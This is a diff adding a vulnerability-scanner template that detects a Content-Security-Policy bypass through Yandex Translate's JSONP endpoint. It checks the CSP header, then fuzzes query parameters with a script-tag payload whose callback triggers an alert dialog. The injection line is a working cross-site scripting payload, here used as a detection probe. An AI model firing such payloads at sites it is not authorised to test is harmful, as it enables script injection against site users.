@@ -1,0 +1,55 @@
+id: yandex-translate-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Yandex Translate
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,yandex-translate
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "yandex.ru"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: yandex_translate_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "yandex_translate_csp_xss == true"
+# digest: 4b0a00483046022100f5442fff6e70df3ec8393e6429374eebcad0cd56b1ecc6c3c709fb53086ef10d022100b648953810015e106b7d84f8f9bb3bd0b73628a79583f78087fa77955095bebe:922c64590222798bb761d5b6d8e72950
